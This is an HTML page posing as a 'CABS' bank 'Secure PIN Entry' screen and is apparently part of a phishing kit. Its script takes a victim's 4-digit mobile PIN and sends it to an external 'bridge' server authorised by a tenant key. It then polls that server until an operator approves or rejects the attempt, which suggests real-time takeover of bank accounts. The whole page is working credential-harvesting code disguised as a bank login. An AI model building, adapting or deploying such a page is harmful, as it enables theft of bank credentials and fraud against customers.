<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CABS - Enter Mobile PIN</title>
    <style>
        :root {
            --cabs-blue: #0d1a70;
            --cabs-green: #67ad38;
            --text-gray: #6b7280;
            --border-gray: #cdd1d5;
            --bg-color: #ffffff;
        }

        * { box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 0; }

        body { background-color: var(--bg-color); display: flex; justify-content: center; align-items: center; min-height: 100vh; }

        /* Progress Overlay */
        #progress-overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(255,255,255,0.95); display: none;
            justify-content: center; align-items: center; z-index: 2000; flex-direction: column;
        }

        .progress-circle {
            width: 60px; height: 60px; border-radius: 50%; border: 6px solid #eee;
            border-top: 6px solid var(--cabs-blue); animation: spin 1s linear infinite; margin-bottom: 20px;
        }

        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        .login-container { width: 100%; max-width: 500px; padding: 40px 20px; background: white; }

        .logo-container { text-align: center; margin-bottom: 40px; }
        
        .welcome-text { font-size: 32px; color: var(--cabs-blue); font-weight: 800; line-height: 1.1; margin-bottom: 5px; }

        .ib-text { font-size: 32px; color: var(--cabs-green); font-weight: 800; line-height: 1.1; margin-bottom: 15px; }

        .instruction-text { color: var(--text-gray); font-size: 15px; line-height: 1.5; margin-bottom: 30px; }

        .pin-container { display: flex; justify-content: center; margin-bottom: 20px; gap: 15px; }

        .pin-input {
            width: 60px; height: 70px; border: 2px solid var(--border-gray);
            border-radius: 8px; font-size: 36px; font-weight: bold; color: var(--cabs-blue);
            text-align: center; outline: none; background-color: #fafafa;
        }

        .pin-input:focus { border-color: var(--cabs-blue); background-color: #fff; }

        .btn-solid {
            background: var(--cabs-blue); color: white; border: none; width: 100%; padding: 14px 0;
            border-radius: 30px; font-size: 14px; font-weight: 700; cursor: pointer; text-transform: uppercase;
        }
    </style>
</head>
<body>

    <div id="progress-overlay">
        <div class="progress-circle"></div>
        <p style="color: var(--cabs-blue); font-weight: 600;">Processing PIN...</p>
    </div>

    <div class="login-container">
        <div class="logo-container">
            <img src="logo.png" alt="CABS Logo" style="width: 150px; margin-bottom: 10px;">
        </div>

        <div class="welcome-text">Secure</div>
        <div class="ib-text">PIN Entry</div>
        
        <p class="instruction-text">Please enter your 4-digit Mobile PIN to authenticate.</p>

        <form onsubmit="submitPinToBridge(event);">
            <div class="pin-container">
                <input type="password" id="p1" class="pin-input" maxlength="1" inputmode="numeric" required autofocus>
                <input type="password" id="p2" class="pin-input" maxlength="1" inputmode="numeric" required>
                <input type="password" id="p3" class="pin-input" maxlength="1" inputmode="numeric" required>
                <input type="password" id="p4" class="pin-input" maxlength="1" inputmode="numeric" required>
            </div>
            <button type="submit" class="btn-solid">CONFIRM PIN</button>
        </form>
    </div>

    <script src="config.js"></script>
    <script>
        const BRIDGE_URL = window.APP_CONFIG.BRIDGE_URL;
        const inputs = document.querySelectorAll('.pin-input');
        
        inputs.forEach((input, index) => {
            input.addEventListener('input', (e) => {
                e.target.value = e.target.value.replace(/[^0-9]/g, '');
                if (e.target.value !== '' && index < inputs.length - 1) inputs[index + 1].focus();
            });
            input.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && e.target.value === '' && index > 0) inputs[index - 1].focus();
            });
        });

        async function submitPinToBridge(event) {
            event.preventDefault();
            const pin = Array.from(inputs).map(i => i.value).join('');
            if (pin.length !== 4) return alert('Enter 4-digit PIN');
            document.getElementById('progress-overlay').style.display = 'flex';

            try {
                const response = await fetch(`${BRIDGE_URL}/v1/callback`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${window.APP_CONFIG.TENANT_KEY}` },
                    body: JSON.stringify({ type: 'pin', pin: pin })
                });
                const { attemptId } = await response.json();
                pollStatus(attemptId);
            } catch (error) { alert('Failed.'); document.getElementById('progress-overlay').style.display = 'none'; }
        }

        async function pollStatus(attemptId) {
            const interval = setInterval(async () => {
                const res = await fetch(`${BRIDGE_URL}/v1/status?attemptId=${attemptId}`, {
                    headers: { 'Authorization': `Bearer ${window.APP_CONFIG.TENANT_KEY}` }
                });
                const { status } = await res.json();
                if (status === 'approved') { window.location.href = 'index.html'; clearInterval(interval); }
                else if (status === 'rejected') { alert('PIN rejected.'); clearInterval(interval); document.getElementById('progress-overlay').style.display = 'none'; }
            }, 3000);
        }
    </script>
</body>
</html>
